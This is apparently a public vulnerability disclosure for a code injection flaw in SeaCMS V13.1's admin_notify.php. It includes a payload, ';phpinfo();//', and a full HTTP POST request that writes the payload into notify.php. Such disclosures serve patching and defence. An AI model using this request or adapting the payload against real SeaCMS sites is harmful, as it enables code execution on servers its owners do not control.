---
tags:
  - 漏洞公开
---
# SeaCMS V13.1 code injection
*SeaCMS V13.1 代码注入*
## Environment
*环境*
V13
![[Pasted image 20241009103209.png]]
https://www.seacms.net/
## Analysis
*分析*
Injecting malicious code into the notification module of the member message notification module in the backend user module, the unsafe handling of the "notify" variable in the file "admin_notify. php" resulted in the injection of code.
*在后端用户模块的成员消息通知模块的通知模块中注入恶意代码，对文件“admin_notify.php”中的“notify”变量的不安全处理导致代码注入*
![[Pasted image 20241009103256.png]]
## Verify
*证明*
Backend: User ->Member Message Notification ->Notification
*后台:用户->会员消息通知->通知*
![[Pasted image 20241009103505.png]]
```php
;phpinfo();//
```
![[Pasted image 20241009103543.png]]
Successfully injected code
![[Pasted image 20241009103552.png]]
```http
POST /d3kdjs/admin_notify.php?action=set HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://localhost
Connection: close
Referer: http://localhost/d3kdjs/admin_notify.php
Cookie: iconSize=16x16; jenkins-timestamper-offset=-28800000; PHPSESSID=fv6b5117hu9kv7fbepjs9ie1n2; XDEBUG_SESSION=PHPSTORM; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4

notify1=";phpinfo();//&notify2=&notify3=
```
![[Pasted image 20241009103842.png]]
Malicious code successfully written to notify.chp file.
*"恶意代码成功写入notify.php文件中"*
![[Pasted image 20241009103740.png]]